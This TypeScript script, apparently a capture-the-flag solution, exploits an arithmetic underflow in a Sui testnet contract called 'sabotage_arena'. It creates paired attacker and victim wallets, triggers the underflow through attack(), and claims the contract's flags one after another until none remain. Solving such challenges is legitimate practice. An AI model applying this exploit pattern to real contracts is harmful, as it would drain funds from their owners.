import { SuiGrpcClient } from '@mysten/sui/grpc';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { Transaction } from '@mysten/sui/transactions';
import keyPairJson from "../keypair.json" with { type: "json" };
import arenaJson from "../../arena.json" with { type: "json" };

const mainKeypair = Ed25519Keypair.fromSecretKey(keyPairJson.privateKey);
const mainAddress = mainKeypair.getPublicKey().toSuiAddress();

const client = new SuiGrpcClient({
    network: 'testnet',
    baseUrl: 'https://fullnode.testnet.sui.io:443',
});

const PACKAGE_ID = arenaJson.package_id;
const ARENA_ID = "0xd7dd51e3c156a0c0152cad6bc94884db5302979e78f04d631a51ab107f9449e6";
const CLOCK_ID = "0x6";

async function rpc(method: string, params: any[]) {
    const resp = await fetch('https://fullnode.testnet.sui.io:443', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params })
    });
    return (await resp.json()).result;
}

async function getRemainingFlags(): Promise<number> {
    const arena = await rpc('sui_getObject', [ARENA_ID, { showContent: true }]);
    return Number(arena?.data?.content?.fields?.flags_remaining ?? 0);
}

async function signAndExecute(tx: Transaction, signer: Ed25519Keypair, label: string) {
    console.log(`    Executing ${label}...`);
    try {
        const result: any = await client.signAndExecuteTransaction({
            transaction: tx,
            signer: signer,
            options: { showEffects: true }
        });
        
        // Handle different possible result structures
        const status = result?.effects?.status?.status || result?.effects?.V1?.status?.status;
        if (status && status !== 'success') {
             throw new Error(`${label} failed: ${status}`);
        }
        return result;
    } catch (e: any) {
        console.error(`    ${label} error details:`, e.message);
        throw e;
    }
}

async function sweepOne(index: number) {
    console.log(`\n--- Sweeping Flag #${index} ---`);
    
    // Check main balance
    const balanceResult = await rpc('suix_getBalance', [mainAddress]);
    const balance = BigInt(balanceResult.totalBalance);
    console.log(`  Main Balance: ${balance} MIST`);
    
    if (balance < 200_000_000n) {
        console.warn(`  Insufficient funds.`);
        return false;
    }

    const attacker = new Ed25519Keypair();
    const victim = new Ed25519Keypair();
    const victimAddress = victim.getPublicKey().toSuiAddress();

    console.log(`  Funding Pair...`);
    const fundTx = new Transaction();
    fundTx.setGasBudget(20000000n);
    const [c1] = fundTx.splitCoins(fundTx.gas, [100_000_000n]); // 0.1 SUI
    const [c2] = fundTx.splitCoins(fundTx.gas, [100_000_000n]); // 0.1 SUI
    fundTx.transferObjects([c1], attacker.getPublicKey().toSuiAddress());
    fundTx.transferObjects([c2], victimAddress);
    await signAndExecute(fundTx, mainKeypair, "Funding");
    await new Promise(r => setTimeout(r, 4000));

    try {
        console.log("  Registering Attacker...");
        const regTxA = new Transaction();
        regTxA.setGasBudget(10000000n);
        regTxA.moveCall({
            target: `${PACKAGE_ID}::sabotage_arena::register`,
            arguments: [regTxA.object(ARENA_ID), regTxA.object(CLOCK_ID)],
        });
        await signAndExecute(regTxA, attacker, "Attacker Registration");

        console.log("  Registering Victim...");
        const regTxV = new Transaction();
        regTxV.setGasBudget(10000000n);
        regTxV.moveCall({
            target: `${PACKAGE_ID}::sabotage_arena::register`,
            arguments: [regTxV.object(ARENA_ID), regTxV.object(CLOCK_ID)],
        });
        await signAndExecute(regTxV, victim, "Victim Registration");

        await new Promise(r => setTimeout(r, 4000));

        console.log("  Attacking (Underflow)...");
        const attackTx = new Transaction();
        attackTx.setGasBudget(10000000n);
        attackTx.moveCall({
            target: `${PACKAGE_ID}::sabotage_arena::attack`,
            arguments: [
                attackTx.object(ARENA_ID),
                attackTx.pure.address(victimAddress),
                attackTx.object(CLOCK_ID),
            ],
        });
        await signAndExecute(attackTx, attacker, "Attack");

        await new Promise(r => setTimeout(r, 3000));

        console.log("  Claiming Flag...");
        const claimTx = new Transaction();
        claimTx.setGasBudget(10000000n);
        const [flag] = claimTx.moveCall({
            target: `${PACKAGE_ID}::sabotage_arena::claim_flag`,
            arguments: [claimTx.object(ARENA_ID), claimTx.object(CLOCK_ID)],
        });
        claimTx.transferObjects([flag], mainAddress);
        const result = await signAndExecute(claimTx, victim, "Claim Flag");
        console.log(`  Flag claimed! Digest: ${(result as any).digest}`);
        return true;
    } catch (e: any) {
        console.error(`  Sweep failed: ${e.message}`);
        return false;
    }
}

async function main() {
    let flagsRemaining = await getRemainingFlags();
    console.log(`Starting sweep for ${flagsRemaining} flags...`);
    
    let count = 0;
    for (let i = 1; i <= flagsRemaining; i++) {
        const success = await sweepOne(i);
        if (success) count++;
        else break;
        await new Promise(r => setTimeout(r, 4000));
    }
    
    console.log(`\nSweep Session Done. Claimed ${count} flags.`);
}

main().catch(console.error);
